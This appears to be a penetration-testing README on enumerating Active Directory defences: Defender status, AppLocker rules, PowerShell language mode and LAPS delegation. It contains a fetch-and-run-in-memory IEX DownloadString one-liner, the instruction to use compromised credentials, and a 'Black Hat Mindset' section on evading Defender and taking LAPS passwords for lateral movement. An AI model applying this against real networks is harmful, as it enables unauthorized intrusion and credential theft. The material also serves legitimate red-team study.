# Active Directory Enumerating Security Controls

This README focuses on identifying security controls like Windows Defender, AppLocker policies, PowerShell language modes, and LAPS configurations to assess the environment's defenses.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating Security Controls](#enumerating-security-controls)
- [Enumerating LAPS Configurations](#enumerating-laps-configurations)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Security controls in Active Directory environments, such as antivirus, application whitelisting, script execution restrictions, and local admin password management, can hinder an attacker's progress. Enumerating these controls helps identify potential obstacles and misconfigurations. This guide uses PowerShell cmdlets and LAPSToolkit to enumerate Windows Defender, AppLocker, PowerShell language modes, and LAPS settings.

## Setup and Prerequisites

- **Environment**: Windows host with PowerShell and Active Directory module.
- **PowerShell**: Run with administrative privileges (right-click > "Run as Administrator").
- **Active Directory Module**: Install via RSAT tools and import with `Import-Module ActiveDirectory` (Windows host).
- **Windows Defender Module**: Ensure the Defender module is available (e.g., `Import-Module Defender` if needed).
- **AppLocker Module**: Ensure the AppLocker module is available (e.g., `Import-Module AppLocker`).
- **LAPSToolkit**: Download LAPSToolkit.ps1 (e.g., from its GitHub repo) and load into memory:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1')
  ```
- **Permissions**: Use compromised credentials with sufficient access to query security settings (e.g., domain user or local admin).

## Enumerating Security Controls

Assess the target's security posture by enumerating antivirus, AppLocker policies, and PowerShell restrictions.

```powershell
# Get Windows Defender status
Get-MpComputerStatus

# Retrieve AppLocker policies
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Check PowerShell language mode
$ExecutionContext.SessionState.LanguageMode
```

## Enumerating LAPS Configurations

Identify LAPS (Local Administrator Password Solution) configurations to find potential privilege escalation paths.

```powershell
# Find groups delegated to manage LAPS passwords
Find-LAPSDelegatedGroups

# Check rights on LAPS-enabled computers
Find-AdmPwdExtendedRights

# Search for computers with LAPS enabled
Get-LAPSComputers
```

## Black Hat Mindset

- **Assess Defenses**: Identify active security controls (e.g., Defender, AppLocker) to plan bypass techniques.
- **Target LAPS**: Exploit delegated groups or extended rights to access local admin passwords for lateral movement.
- **Bypass Restrictions**: Use ConstrainedLanguage mode findings to craft compatible payloads or switch to other execution methods.
- **Stay Stealthy**: Avoid triggering Defender by running enumeration in memory and minimizing disk writes.

## Resources

- [Windows Defender PowerShell](#)
- [AppLocker Documentation](#)
- [PowerShell Language Modes](#)
- [LAPSToolkit GitHub](#)
- [LAPS Overview](#)

